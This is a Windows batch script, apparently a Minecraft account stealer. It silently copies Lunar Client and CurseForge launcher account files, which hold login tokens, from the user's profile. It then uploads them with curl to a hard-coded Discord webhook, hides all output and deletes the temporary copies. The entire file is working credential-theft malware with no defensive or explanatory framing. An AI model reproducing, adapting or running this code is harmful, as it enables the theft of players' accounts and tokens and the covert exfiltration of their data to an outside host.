@echo off
setlocal EnableDelayedExpansion

set "WEBHOOK_URL=https://discord.com/api/webhooks/1471193098091630726/C85gFl5ivKmNMpi4kh25JN2HGg55RMSXcrbIhOk3xL8yms8KkCRef1y_lVq7S1-clJZj"

:: -------------------------------------------------------------
:: 1. Lunar Client Accounts
:: -------------------------------------------------------------
set "JSON_PATH=%USERPROFILE%\.lunarclient\settings\game\accounts.json"
set "TXT_FILE=%TEMP%\lunar_%random%.txt"

if exist "%JSON_PATH%" (
    where curl >nul 2>&1
    if not errorlevel 1 (
        copy "%JSON_PATH%" "%TXT_FILE%" >nul 2>&1
        if exist "%TXT_FILE%" (
            curl -X POST -F "content=# Lunar Client Accounts" -F "file=@%TXT_FILE%" "%WEBHOOK_URL%" >nul 2>&1
            del "%TXT_FILE%" >nul 2>&1
        )
    )
)

:: -------------------------------------------------------------
:: 2. CurseForge Launcher Accounts
:: -------------------------------------------------------------
set "JSON_PATH=%USERPROFILE%\curseforge\minecraft\Install\launcher_accounts.json"
set "TXT_FILE=%TEMP%\curseforge_%random%.txt"

if exist "%JSON_PATH%" (
    where curl >nul 2>&1
    if not errorlevel 1 (
        copy "%JSON_PATH%" "%TXT_FILE%" >nul 2>&1
        if exist "%TXT_FILE%" (
            curl -X POST -F "content=# CurseForge Launcher Accounts" -F "file=@%TXT_FILE%" "%WEBHOOK_URL%" >nul 2>&1
            del "%TXT_FILE%" >nul 2>&1
        )
    )
)

exit
